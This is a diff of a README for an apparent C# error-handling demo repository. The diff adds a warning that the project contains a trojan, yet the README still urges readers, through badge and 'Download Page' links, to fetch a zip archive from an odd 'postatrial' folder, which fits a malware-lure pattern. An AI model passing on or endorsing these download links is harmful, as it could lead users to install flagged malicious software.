@@ -1,3 +1,7 @@
+WARNING: This project contains a virus/backdoor/trojan.
+My browsers block it and antivirus programs flag it as “highly dangerous.” I have attached a screenshot
+
+
 # 🚀 csharp-error-handling-demo - Learn Error Handling in C# Easily
 
 [![Download Latest Release](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip%20Latest%20Release-Visit%20Here-blue)](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip)
@@ -72,5 +76,6 @@ The Result Pattern offers a more modern approach. It returns an object that indi
 ## 📞 Contact
 
 For any questions or feedback, feel free to create an issue in the repository or reach out directly via GitHub.
+
 
 Don’t forget to visit the [Download Page](https://raw.githubusercontent.com/Akhilrathina/csharp-error-handling-demo/main/postatrial/csharp-error-handling-demo.zip) to install the application and start exploring error handling in C# today!
